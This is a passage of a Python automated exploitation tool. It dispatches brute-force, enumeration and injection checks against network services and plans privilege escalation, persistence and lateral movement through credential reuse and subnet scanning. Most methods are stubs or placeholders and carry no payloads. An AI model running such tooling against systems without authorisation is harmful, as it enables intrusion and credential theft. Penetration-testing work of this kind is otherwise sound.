            # Windows privilege escalation
            elif service in ['rdp', 'smb']:
                escalation_results.append({
                    'technique': 'windows_privesc',
                    'status': 'attempted',
                    'description': 'Attempted Windows privilege escalation'
                })
            
            self.evidence.collect_evidence(
                'privilege_escalation', 'custom', 'privesc_attempt',
                f'Attempted {len(escalation_results)} techniques', len(escalation_results) > 0
            )
            
            return {
                'success': len(escalation_results) > 0,
                'techniques': escalation_results
            }
            
        except Exception as e:
            self.logger.error(f"Privilege escalation failed: {e}")
            return {'success': False, 'techniques': []}
    
    def _establish_persistence(self, service: str, credentials: Dict) -> Dict:
        """Attempt to establish persistence after successful exploitation"""
        try:
            persistence_methods = []
            
            # SSH key-based persistence
            if service == 'ssh' and 'username' in credentials:
                persistence_methods.append({
                    'method': 'ssh_key_persistence',
                    'status': 'planned',
                    'description': 'SSH key-based persistence mechanism'
                })
            
            # Registry persistence for Windows
            elif service in ['rdp', 'smb']:
                persistence_methods.append({
                    'method': 'registry_persistence',
                    'status': 'planned',
                    'description': 'Windows registry persistence mechanism'
                })
            
            # Cron job persistence for Linux
            elif service in ['ssh', 'telnet']:
                persistence_methods.append({
                    'method': 'cron_persistence',
                    'status': 'planned',
                    'description': 'Cron job persistence mechanism'
                })
            
            self.evidence.collect_evidence(
                'persistence_attempt', 'custom', 'persistence_planning',
                f'Planned {len(persistence_methods)} methods', len(persistence_methods) > 0
            )
            
            return {
                'success': len(persistence_methods) > 0,
                'methods': persistence_methods
            }
            
        except Exception as e:
            self.logger.error(f"Persistence establishment failed: {e}")
            return {'success': False, 'methods': []}
    
    def _perform_lateral_movement(self, service: str, credentials: Dict) -> Dict:
        """Attempt lateral movement to other systems"""
        try:
            movement_attempts = []
            
            # Network scanning for lateral movement
            if credentials:
                # Scan for other systems in the network
                network = '.'.join(self.target_ip.split('.')[:-1]) + '.0/24'
                
                movement_attempts.append({
                    'technique': 'network_scanning',
                    'target': network,
                    'status': 'planned',
                    'description': f'Scan network {network} for lateral movement targets'
                })
                
                # Credential reuse attempts
                movement_attempts.append({
                    'technique': 'credential_reuse',
                    'credentials': credentials,
                    'status': 'planned',
                    'description': 'Attempt credential reuse on other systems'
                })
            
            self.evidence.collect_evidence(
                'lateral_movement', 'custom', 'lateral_movement_planning',
                f'Planned {len(movement_attempts)} techniques', len(movement_attempts) > 0
            )
            
            return {
                'success': len(movement_attempts) > 0,
                'techniques': movement_attempts
            }
            
        except Exception as e:
            self.logger.error(f"Lateral movement failed: {e}")
            return {'success': False, 'techniques': []}

    # Missing service exploitation methods
    def _exploit_telnet(self, port: int, service_info: Dict) -> Dict:
        """Exploit Telnet service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Brute force credentials
        brute_result = self._brute_force_telnet(port, service_info)
        results['total_attempts'] += 1
        if brute_result['success']:
            results['successful_attempts'] += 1
            results['credentials'].extend(brute_result.get('credentials', []))
            results['access_gained'] = True
        
        return results
    
    def _exploit_smtp(self, port: int, service_info: Dict) -> Dict:
        """Exploit SMTP service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Enumerate users
        enum_result = self._enumerate_smtp_users(port, service_info)
        results['total_attempts'] += 1
        if enum_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(enum_result.get('vulnerabilities', []))
        
        # Test open relay
        relay_result = self._test_smtp_open_relay(port, service_info)
        results['total_attempts'] += 1
        if relay_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'smtp_open_relay',
                'severity': 'high',
                'description': 'SMTP server allows open relay'
            })
        
        return results
    
    def _exploit_dns(self, port: int, service_info: Dict) -> Dict:
        """Exploit DNS service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Test zone transfer
        zone_result = self._test_dns_zone_transfer(port, service_info)
        results['total_attempts'] += 1
        if zone_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'dns_zone_transfer',
                'severity': 'medium',
                'description': 'DNS zone transfer allowed'
            })
        
        # Test cache poisoning
        cache_result = self._test_dns_cache_poisoning(port, service_info)
        results['total_attempts'] += 1
        if cache_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'dns_recursion_enabled',
                'severity': 'medium',
                'description': 'DNS recursion enabled - potential cache poisoning'
            })
        
        return results
    
    def _exploit_pop3(self, port: int, service_info: Dict) -> Dict:
        """Exploit POP3 service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Basic POP3 exploitation (placeholder)
        results['total_attempts'] += 1
        
        return results
    
    def _exploit_imap(self, port: int, service_info: Dict) -> Dict:
        """Exploit IMAP service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Basic IMAP exploitation (placeholder)
        results['total_attempts'] += 1
        
        return results
    
    def _exploit_snmp(self, port: int, service_info: Dict) -> Dict:
        """Exploit SNMP service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Brute force community strings
        brute_result = self._brute_force_snmp_community(port, service_info)
        results['total_attempts'] += 1
        if brute_result['success']:
            results['successful_attempts'] += 1
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # Enumerate SNMP information
        enum_result = self._enumerate_snmp(port, service_info)
        results['total_attempts'] += 1
        if enum_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(enum_result.get('vulnerabilities', []))
        
        return results
    
    def _exploit_ldap(self, port: int, service_info: Dict) -> Dict:
        """Exploit LDAP service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Test anonymous bind
        anon_result = self._test_ldap_anonymous_bind(port, service_info)
        results['total_attempts'] += 1
        if anon_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'ldap_anonymous_bind',
                'severity': 'medium',
                'description': 'LDAP allows anonymous bind'
            })
        
        # Test LDAP injection
        injection_result = self._test_ldap_injection(port, service_info)
        results['total_attempts'] += 1
        if injection_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'ldap_injection',
                'severity': 'high',
                'description': 'LDAP injection vulnerability detected'
            })
        
        return results
    
    def _exploit_oracle(self, port: int, service_info: Dict) -> Dict:
        """Exploit Oracle database service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Basic Oracle exploitation (placeholder)
        results['total_attempts'] += 1
        
        return results
    
    def _exploit_winrm(self, port: int, service_info: Dict) -> Dict:
        """Exploit WinRM service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Basic WinRM exploitation (placeholder)
        results['total_attempts'] += 1
        
        return results
    
    def _exploit_wmi(self, port: int, service_info: Dict) -> Dict:
        """Exploit WMI service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Basic WMI exploitation (placeholder)
        results['total_attempts'] += 1
        
        return results
    
    def _exploit_nfs(self, port: int, service_info: Dict) -> Dict:
        """Exploit NFS service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Test NFS shares
        shares_result = self._test_nfs_shares(port, service_info)
        results['total_attempts'] += 1
        if shares_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(shares_result.get('vulnerabilities', []))
        
        return results
    
    def _exploit_rpc(self, port: int, service_info: Dict) -> Dict:
        """Exploit RPC service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Enumerate RPC services
        enum_result = self._enumerate_rpc(port, service_info)
        results['total_attempts'] += 1
        if enum_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(enum_result.get('vulnerabilities', []))
        
        # Test null session
        null_result = self._test_rpc_null_session(port, service_info)
        results['total_attempts'] += 1
        if null_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'rpc_null_session',
                'severity': 'medium',
                'description': 'RPC allows null session'
            })
        
        return results
    
    def _exploit_kerberos(self, port: int, service_info: Dict) -> Dict:
        """Exploit Kerberos service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Basic Kerberos exploitation (placeholder)
        results['total_attempts'] += 1
        
        return results
    
    def _exploit_tftp(self, port: int, service_info: Dict) -> Dict:
        """Exploit TFTP service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Test TFTP access
        access_result = self._test_tftp_access(port, service_info)
        results['total_attempts'] += 1
        if access_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'tftp_file_access',
                'severity': 'medium',
                'description': 'TFTP allows file access'
            })
        
        return results
    
    # Placeholder methods for other services
    def _exploit_dhcp(self, port: int, service_info: Dict) -> Dict:
        """Exploit DHCP service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_ntp(self, port: int, service_info: Dict) -> Dict:
        """Exploit NTP service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_syslog(self, port: int, service_info: Dict) -> Dict:
        """Exploit Syslog service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_rsync(self, port: int, service_info: Dict) -> Dict:
        """Exploit Rsync service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_mongodb(self, port: int, service_info: Dict) -> Dict:
        """Exploit MongoDB service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_redis(self, port: int, service_info: Dict) -> Dict:
        """Exploit Redis service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_elasticsearch(self, port: int, service_info: Dict) -> Dict:
        """Exploit Elasticsearch service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_cassandra(self, port: int, service_info: Dict) -> Dict:
        """Exploit Cassandra service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_memcached(self, port: int, service_info: Dict) -> Dict:
        """Exploit Memcached service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_docker(self, port: int, service_info: Dict) -> Dict:
        """Exploit Docker service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_kubernetes(self, port: int, service_info: Dict) -> Dict:
        """Exploit Kubernetes service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_jenkins(self, port: int, service_info: Dict) -> Dict:
        """Exploit Jenkins service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_tomcat(self, port: int, service_info: Dict) -> Dict:
        """Exploit Tomcat service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_jboss(self, port: int, service_info: Dict) -> Dict:
        """Exploit JBoss service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_weblogic(self, port: int, service_info: Dict) -> Dict:
        """Exploit WebLogic service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_websphere(self, port: int, service_info: Dict) -> Dict:
        """Exploit WebSphere service"""
        return {'total_attempts': 1, 'successful_attempts': 0, 'vulnerabilities': [], 'credentials': [], 'access_gained': False}
    
    def _exploit_iis(self, port: int, service_info: Dict) -> Dict:
        """Exploit IIS service"""
        return self._exploit_http(port, service_info)  # Reuse HTTP exploitation
    
    def _exploit_apache(self, port: int, service_info: Dict) -> Dict:
        """Exploit Apache service"""
        return self._exploit_http(port, service_info)  # Reuse HTTP exploitation
    
    def _exploit_nginx(self, port: int, service_info: Dict) -> Dict:
        """Exploit Nginx service"""
        return self._exploit_http(port, service_info)  # Reuse HTTP exploitation
    
    def _exploit_lighttpd(self, port: int, service_info: Dict) -> Dict:
        """Exploit Lighttpd service"""
        return self._exploit_http(port, service_info)  # Reuse HTTP exploitation
    
    def _exploit_ssl(self, port: int, service_info: Dict) -> Dict:
        """Exploit SSL/TLS service"""
        results = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False
        }
        
        # Test SSL vulnerabilities
        ssl_result = self._test_ssl_vulnerabilities(port, service_info)
        results['total_attempts'] += 1
        if ssl_result['success']:
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(ssl_result.get('vulnerabilities', []))
        
        return results

def setup_logging(level: str = 'INFO') -> None:
    """Configure logging for the exploitation system"""
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    logging.basicConfig(
        level=getattr(logging, level.upper()),
        format=log_format,
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler('exploitation.log')
        ]
    )

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Enhanced Automated Exploitation System')
    parser.add_argument('target', help='Target IP address or enumeration file path')
    parser.add_argument('--intensity', choices=['low', 'medium', 'high', 'aggressive'], 
                       default='medium', help='Exploitation intensity level')
    parser.add_argument('--enumeration-file', help='Path to enumeration results JSON file')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='Logging level')
    parser.add_argument('--output', help='Output file for results')
    
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_level)
    logger = logging.getLogger('main')
    
    try:
        # Determine target IP and enumeration file
        target_ip = args.target
        enumeration_file = args.enumeration_file if args.enumeration_file else args.target
        
        # If target looks like a file path, extract IP from the file
        if args.target.endswith('.json') or '/' in args.target:
            try:
                with open(args.target, 'r') as f:
                    enum_data = json.load(f)
                
                # Extract target IP from enumeration data
                if 'target' in enum_data:
                    target_ip = enum_data['target']
                elif 'dc_analysis' in enum_data and 'target' in enum_data['dc_analysis']:
                    target_ip = enum_data['dc_analysis']['target']
                elif 'detailed_results' in enum_data and 'service_enumeration' in enum_data['detailed_results']:
                    target_ip = enum_data['detailed_results']['service_enumeration'].get('target', args.target)
                else:
                    # Try to extract IP from filename as fallback
                    import re
                    ip_match = re.search(r'(\d+[._]\d+[._]\d+[._]\d+)', args.target)
                    if ip_match:
                        target_ip = ip_match.group(1).replace('_', '.')
                    else:
                        logger.error(f"Could not extract target IP from file: {args.target}")
                        sys.exit(1)
                
                enumeration_file = args.target
                logger.info(f"Extracted target IP: {target_ip} from enumeration file: {enumeration_file}")
                
            except Exception as e:
                logger.error(f"Failed to extract target IP from file {args.target}: {e}")
                sys.exit(1)
        
        # Initialize and run exploitation
        logger.info(f"Starting exploitation of target: {target_ip}")
        
        # Initialize evidence collector with the correct target IP
        evidence_collector = EvidenceCollector(target_ip)
        
        # Initialize service exploiter with evidence collector and correct target IP
        exploiter = ServiceExploiter(evidence_collector, target_ip)
        
        # Run comprehensive exploitation
        results = exploiter.run_exploitation(enumeration_file)
        
        # Output results
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            logger.info(f"Results saved to {args.output}")
        else:
            print(json.dumps(results, indent=2, default=str))
            
        # Print summary
        summary = results['summary']
        print(f"\n=== Exploitation Summary ===")
        print(f"Target: {target_ip}")
        print(f"Services Exploited: {summary['total_services']}")
        print(f"Successful Exploits: {summary['successful_exploits']}")
        print(f"Vulnerabilities Found: {summary['vulnerabilities_found']}")
        print(f"Credentials Discovered: {summary['credentials_discovered']}")
        print(f"Evidence Directory: {CONFIG['evidence_dir']}/{target_ip}")
        
        # Return non-zero exit code if no services were tested
        if summary['total_services'] == 0:
            logger.warning("No services were tested - check enumeration data")
            sys.exit(2)
        
    except KeyboardInterrupt:
        logger.info("Exploitation interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Exploitation failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        sys.exit(1)

if __name__ == '__main__':
    main()